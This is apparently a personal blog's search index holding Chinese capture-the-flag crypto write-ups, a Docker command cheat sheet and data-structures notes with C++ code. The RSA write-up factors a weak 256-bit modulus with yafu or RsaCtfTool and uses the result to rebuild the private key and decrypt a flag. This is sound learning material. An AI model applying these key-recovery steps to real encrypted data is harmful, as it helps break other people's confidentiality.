<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[BUUCTF]rsa</title>
    <url>/2022/01/25/%5BCrypto%5Drsa/</url>
    <content><![CDATA[<p>给了两个文件, 一个加密后的文件, 一个<code>公钥</code>,
开始我以为是用<code>公钥</code>去解密<code>私钥</code>加密的文件,
但是很多加密库都没有提供这样的功能, 比如<code>OpenSSL</code>,
只有用<code>公钥</code>验签的功能.
看了别人的WP才知道这个题是分解公钥的<code>模</code>来实现算出<code>私钥</code>再进行解密.</p>
<p>用<code>OpenSSL</code>可以查看<code>公钥</code>的一些信息</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251321659.png"
alt="image-20220125132123596" />
<figcaption aria-hidden="true">image-20220125132123596</figcaption>
</figure>
<p>我们可以得知 <span class="math display">\[
\begin{aligned}
&amp;e=65537\\
&amp;n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD
\end{aligned}
\]</span></p>
<p>而且<code>公钥</code>比常见的要短很多, 只有<code>256Bit</code>,
这为攻击提供了方便</p>
<p>一些分解<code>模</code>的工具:</p>
<blockquote>
<p>RsaCtfTool: <a
href="https://github.com/Ganapati/RsaCtfTool">Github</a>
//这个工具不支持Windows</p>
<p>yafu: <a
href="https://sourceforge.net/projects/yafu/">Sourceforge</a></p>
<p>Msieve: <a
href="https://sourceforge.net/projects/msieve/">Sourceforge</a></p>
</blockquote>
<p><code>yafu</code>方式, 运行后进入<code>yafu</code>命令行, 输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">factor(0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD)</span><br></pre></td></tr></table></figure>
<p>即可开始分解</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251401490.png"
alt="image-20220125140140434" />
<figcaption aria-hidden="true">image-20220125140140434</figcaption>
</figure>
<p><code>RsaCtfTool</code>方式, 安装好后输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RsaCtfTool.py -n 0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD -e 65537 --private --dumpkey</span><br></pre></td></tr></table></figure>
<p>工具就会综合判断自动采用合适的方式得出私钥(也可以直接用这个工具解密文件,
详细用法见Github)</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201251408520.png"
alt="image-202201251408520" />
<figcaption aria-hidden="true">image-202201251408520</figcaption>
</figure>
<p><code>RsaCtfTool</code>已经帮我们生成好了<code>私钥</code>,
如果是用<code>yafu</code>的话还需要计算一下<code>d</code></p>
<p>我们已经得出 <span class="math display">\[
\begin{aligned}
&amp;p=285960468890451637935629440372639283459 \\
&amp;q=304008741604601924494328155975272418463
\end{aligned}
\]</span></p>
<p>有了<span class="math inline">\(p\)</span>和<span
class="math inline">\(q\)</span>就可以轻松求出<code>欧拉函数</code>的值</p>
<p><span
class="math display">\[\phi(n)=\phi(p)\times\phi(q)=(p-1)\times(q-1)\]</span></p>
<p>根据公式 <span class="math inline">\(ed\equiv1(\mod\phi(n))\)</span>,
则<code>d</code>是<code>e</code>模<span
class="math inline">\(\phi(n)\)</span>的<code>模逆元</code>,
<code>Python</code>可以通过<code>gmpy2</code>这个库来求得</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="comment">#此题的密文并非PKCS1_OAEP填充方式</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xC0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)                 <span class="comment">#求欧拉函数值</span></span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi_n))     <span class="comment">#求模逆元d</span></span><br><span class="line"></span><br><span class="line">private_key = RSA.construct((n,e,d,p,q))    <span class="comment">#用参数构造私钥</span></span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)        <span class="comment">#用私钥生成一个Cipher</span></span><br><span class="line">ciphertext = <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">plaintext = cipher.decrypt(ciphertext, <span class="literal">None</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#flag&#123;decrypt_256&#125;</span></span><br></pre></td></tr></table></figure>
<del>
话说BUU为什么把这个题放到Reverse板块里面呢🤨
</del>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>RSA</tag>
        <tag>非对称加密</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]看我回旋踢</title>
    <url>/2021/11/02/%5BCrypto%5D%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/</url>
    <content><![CDATA[<p>题目就是一段密文</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111021552174.png"
alt="img-202111021552174" />
<figcaption aria-hidden="true">img-202111021552174</figcaption>
</figure>
<p>看这格式, 大胆的猜测, 这就是经过某种变换后的<strong>flag</strong></p>
<p>这<code>synt</code>自然就是就是<code>flag</code>变换来的了,
那是怎么变换来的呢? 我们可以先自己对比一下<code>ASCII</code>码,
看看能不能找到规律, 就拿"synt"和"flag"对比, 写个脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;synt&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[115, 121, 110, 116]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
<p>显而易见, 密文就是把明文的字符的<code>ASCII</code>码逐个加+13得来的,
那么写出解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span>:</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flagn(cd$##&#x27;d +)a( &#x27;)d+ b*%# beb(ba#&#x27;$*e$p</span></span><br></pre></td></tr></table></figure>
<p>? ? ?</p>
<p>什么鬼?! 这显然是错的,
看样子不能单纯在<code>ASCII</code>码上+13就完事了</p>
<p>经过一番查找, 得知此题的变换方式方式称为<strong>ROT13(Rotate by 13
places; 回转13位)</strong></p>
<blockquote>
<p><code>ROT13</code>和它的兄弟们:</p>
<p><strong>ROT5</strong>: 只对数字进行编码,
用当前数字往前数的第5个数字替换当前数字, 例如当前为<code>0</code>,
编码后变成<code>5</code>, 当前为<code>1</code>,
编码后变成<code>6</code>, 以此类推顺序循环.</p>
<p><strong>ROT13</strong>: 只对字母进行编码,
用当前字母往前数的第13个字母替换当前字母, 例如当前为<code>A</code>,
编码后变成<code>N</code>, 当前为<code>B</code>,
编码后变成<code>O</code>, 以此类推顺序循环.</p>
<p><strong>ROT18</strong>: 这是一个异类, 本来没有,
它是将ROT5和ROT13组合在一起, 为了好称呼, 将其命名为ROT18.</p>
<p><strong>ROT47</strong>: 对数字、字母、常用符号进行编码,
按照它们的<code>ASCII</code>码进行位置替换,用当前字符<code>ASCII</code>码往前数的第47位对应字符替换当前字符,
例如当前为小写字母<code>z</code>, 编码后变成大写字母<code>K</code>,
当前为数字<code>0</code>, 编码后变成符号<code>_</code>,
用于ROT47编码的字符其<code>ASCII</code>码范围是33－126, 具体可参考<a
href="http://c.biancheng.net/c/ascii/">ASCII码一览表</a>.</p>
</blockquote>
<p>所以这题正确的解密方式就是把字母(<strong>除字母外的字符保持不变</strong>)移+13位,
到了末尾又从头循环,
那么我们只要仿照这个原理写出解密脚本应该就没问题了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">myChar, offset</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(myChar) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+(offset%<span class="number">26</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &gt; <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)-<span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &lt; <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+<span class="number">26</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= <span class="built_in">ord</span>(myChar) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+(offset%<span class="number">26</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &gt; <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)-<span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(myChar) &lt; <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>):</span><br><span class="line">            myChar = <span class="built_in">chr</span>(<span class="built_in">ord</span>(myChar)+<span class="number">26</span>)</span><br><span class="line">    <span class="keyword">return</span> myChar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += shift(ciphertext[i], <span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]变异凯撒</title>
    <url>/2021/11/02/%5BCrypto%5D%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92/</url>
    <content><![CDATA[<p>题目: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密密文：afZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">猜测明文：flag&#123;...&#125;</span><br></pre></td></tr></table></figure></p>
<p>看标题, <strong>变异凯撒</strong>,
想必这题就是基于凯撒密码延伸出来的, 有了上次的经验,
我们再把这个字符的<code>ASCII</code>码拿来对比一下,
密文不外乎又是一些移位变换出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">show_ascii</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> args:</span><br><span class="line">        ascii_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">            ascii_list.append(<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(ascii_list)</span><br><span class="line"></span><br><span class="line">show_ascii(<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span>, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[97, 102, 90, 95, 114, 57, 86, 89, 102, 83, 99, 79...]</span></span><br><span class="line"><span class="comment">#[102, 108, 97, 103]</span></span><br></pre></td></tr></table></figure>
<p>可以看到, 密文的前4位的<code>ASCII</code>码比 "flag"
这4个字符从第1位起依次大了5, 6, 7, 8, 后面的以此类推.
写出解密脚本即可拿到<strong>flag</strong>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])+(<span class="number">5</span>+i))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;Caesar_variation&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>常见CLI工具使用速查</title>
    <url>/2023/03/31/%5BNote%5D%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E9%80%9F%E6%9F%A5/</url>
    <content><![CDATA[<h2 id="docker常用指令及参数">Docker常用指令及参数</h2>
<p><code>docker [OPTIONS] COMMAND</code></p>
<ul>
<li><p><code>search [OPTIONS] TERM</code>: 搜索镜像,
比如<code>sudo docker search httpd</code>.</p></li>
<li><p><code>pull [OPTIONS] NAME[:TAG|@DIGEST]</code>: 拉取指定镜像,
比如<code>docker pull ubuntu:20.04.</code></p></li>
<li><p><code>images</code>: 列出本地的镜像.</p></li>
<li><p><code>attach [OPTIONS] CONTAINER</code>: 附加到某个容器,
比如刚通过<code>CTRL+P+Q</code>从容器中退出,
再通过<code>attach</code>附加回去.</p></li>
<li><p><code>exec [OPTIONS] CONTAINER COMMAND [ARG...]</code>:
在容器内执行指令, 通常用于开启<code>bash</code></p>
<ul>
<li><code>--privileged</code>: 给予容器真正的<code>root</code>权限.</li>
<li><code>-u</code>: 指定执行的用户.</li>
<li><code>-w</code>: 指定工作目录.</li>
<li><code>-t</code>: 分配一个伪终端,
用于执行<code>bash</code>等交互式CLI程序.</li>
<li><code>-i</code>: 保持容器的<code>stdin</code>开启,
使容器能够接受外部输入, 搭配<code>-i</code>使用.</li>
<li><code>-d</code>: 后台运行, 不进入容器. 后台容器可以使用
<code>attach</code>来进入.</li>
</ul></li>
<li><p><code>container COMMAND</code></p>
<ul>
<li><code>prune</code>: 清除所有已停止的容器.</li>
<li><code>ls</code>: 列出容器, 默认是正在运行的容器,
加上<code>-a</code>列出所有容器.</li>
</ul></li>
<li><p><code>run [OPTIONS] IMAGE [COMMAND] [ARG...]</code></p>
<blockquote>
<p><code>exec</code>的参数和<code>run</code>的参数是重合的,
这里只写了和<code>exec</code>不一样的参数.</p>
</blockquote>
<ul>
<li><code>-p</code>: 设置端口映射,
比如将宿主机的80端口映射到容器的80端口, 使用<code>-p 80:80</code>.</li>
<li><code>-v</code>: 挂载宿主机目录到容器内,
保证容器销毁数据不丢失并实现方便的配置.
例如<code>-v /home/x2658y/wwwroot:/usr/local/apache2/htdocs</code>实现将宿主机的网站目录映射到容器的网站根目录里,
无需进入容器和进行拷贝.</li>
<li><code>--name</code>: 取名字, 便于进行操作, 等效于容器ID.</li>
<li><code>--net</code>: 设置网络模式, 可取<code>host</code>,
<code>container</code>, <code>bridge</code>, <code>none</code>.
<code>host</code>模式可以使用宿主机网络, 无需端口映射,
<code>container</code>模式可以与另一个容器共享网络, 默认模式是
<code>bridge</code>, 宿主机访问容器需要进行端口映射.</li>
</ul></li>
<li><p><code>ps [OPTIONS]</code>: 列出容器, <code>-a</code>显示所有容器,
默认只显示正在运行的.</p></li>
<li><p><code>rm [OPTIONS] CONTAINER [CONTAINER...]</code>:
删除已停止的容器, <code>-f</code>可以强行删除正在运行的容器.</p></li>
<li><p><code>start [OPTIONS] CONTAINER [CONTAINER...]</code>:
启动容器</p>
<blockquote>
<p>没有<code>-t</code>选项,
伪终端由<code>run</code>或者<code>exec</code>来分配.</p>
</blockquote>
<ul>
<li><code>-a</code>: 附加到开启的容器.</li>
<li><code>-i</code>: 开启<code>stdin</code>, 使容器能够接受输入.</li>
</ul></li>
<li><p><code>restart [OPTIONS] CONTAINER [CONTAINER...]</code>:
重启容器, 重启后在后台运行.</p></li>
<li><p><code>stop [OPTIONS] CONTAINER [CONTAINER...]</code>:
停止运行容器, 正常停止.</p></li>
<li><p><code>kill [OPTIONS] CONTAINER [CONTAINER...]</code>: 杀死容器,
强行停止.</p></li>
</ul>
<blockquote>
<p>未完待续</p>
</blockquote>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Docker</tag>
        <tag>TShark</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习笔记</title>
    <url>/2023/03/25/%5BNote%5D%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="绪论">绪论</h2>
<h3 id="算法的定义">算法的定义</h3>
<p>解决特定问题求解步骤的描述，在计算机中表现为指令的有限序列，并且每条指令表示一个或多个操作。</p>
<h3 id="算法的特性">算法的特性</h3>
<ul>
<li>有限性: 一个算法必须保证执行有限步之后结束.</li>
<li>确切性: 一个算法的每一步骤必须有确切的定义.</li>
<li>输入: 一个算法有零个或多个输入, 以刻画运算对象的初始情况,
所谓零个输入是指算法本身给定了初始条件.</li>
<li>输出: 一个算法有一个或多个输出. 没有输出的算法毫无意义.</li>
<li>可行性:
一个算法的任何计算步骤都是可以被分解为基本可执行的操作，每个操作都能够在有限时间内完成.</li>
</ul>
<h3 id="算法的设计要求">算法的设计要求</h3>
<p>算法设计一般要求满足以下几点：</p>
<p><strong>1.
正确性：</strong>算法的执行结果应当满足预先规定的功能和性能要求。即算法应当满足具体问题的需求，设计或选择的算法应当能够正确地反映这种需求，这是衡量算法正确与否的准则。</p>
<p><strong>2.
可读性：</strong>一个算法应当思路清晰、层次分明、易读易懂。算法主要是为了人的阅读与交流，其次才是机器执行。可读性好有助于人对算法的理解，而晦涩难懂的算法易于隐藏较多的错误，最终难以调试和修改。</p>
<p><strong>3.
健壮性：</strong>当输入不合法的数据时，应当作适当处理，不致于引起严重后果。例如当输入数据不在允许的范围时，算法应能适当地作出反应或处理，而不会产生莫名其妙的输出结果。</p>
<p><strong>4.
高效性：</strong>有效地使用存储空间和有高效的时间效率。效率是指的执行时间，如果对于一个问题有多个算法可以解决，那么执行时间短的算法效率就高。存储量需求是指算法执行过程中所需的最大存储空间。一个理想的算法应该是数据所占用的存储空间较小而数据处理的速度较快。</p>
<h3 id="时间复杂度计算规则">时间复杂度计算规则</h3>
<ul>
<li><p>加法规则</p>
<p><span
class="math display">\[T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n)))\]</span></p></li>
<li><p>乘法规则</p>
<p><span class="math display">\[T(n)=T_1(n)\times T_2(n)=O(f(n))\times
O(g(n))=O(f(n)\times g(n))\]</span></p></li>
</ul>
<h3 id="常见的时间复杂度大小顺序">常见的时间复杂度大小顺序</h3>
<p><span class="math display">\[O(1)&lt;O(\log n)&lt;O(n)&lt;O(n\log
n)&lt;O(n^2)&lt;O(n^3)&lt;\cdots
&lt;O(n^k)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)\]</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202303251700081.png"
alt="Quick Review: Big-O Notation" />
<figcaption aria-hidden="true">Quick Review: Big-O Notation</figcaption>
</figure>
<h2 id="线性表">线性表</h2>
<h3 id="顺序表的插入">顺序表的插入</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SqList</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType* ptr;  <span class="comment">//数组指针</span></span><br><span class="line">	<span class="type">int</span> length;     <span class="comment">//元素个数</span></span><br><span class="line">	<span class="type">int</span> capacity;   <span class="comment">//数组容量</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitSqList</span><span class="params">(SqList*&amp; L, <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">if</span> (!L)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;ptr = (ElemType*)<span class="built_in">malloc</span>(capacity * <span class="built_in">sizeof</span>(ElemType));</span><br><span class="line">	<span class="keyword">if</span> (!L-&gt;ptr)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">	L-&gt;capacity = capacity;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertSqList</span><span class="params">(SqList* L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; L-&gt;length || L-&gt;length == L-&gt;capacity)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;	<span class="comment">//插入失败: 索引错误或容量已满</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (index == L-&gt;length)	<span class="comment">//插入到线性表最后一个元素的后一个</span></span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = L-&gt;length - <span class="number">1</span>; i &gt;= index; i--)</span><br><span class="line">			<span class="comment">//元素从后往前依次向后移动1次, 从后往前避免覆盖</span></span><br><span class="line">		&#123;</span><br><span class="line">			L-&gt;ptr[i + <span class="number">1</span>] = L-&gt;ptr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplaySqList</span><span class="params">(SqList* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[Blank SqList]\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;ptr[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SqList* s = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="built_in">InitSqList</span>(s, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Blank SqList]</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="循环单链表插入尾指针表示-带头节点">循环单链表插入(尾指针表示,
带头节点)</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//如果当前节点为要插入位置的前一个节点</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//如果新插入的节点是尾节点, 那么把尾指针指向新节点</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如果整个循环链表中都没有目标位置, 就返回错误代码-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span 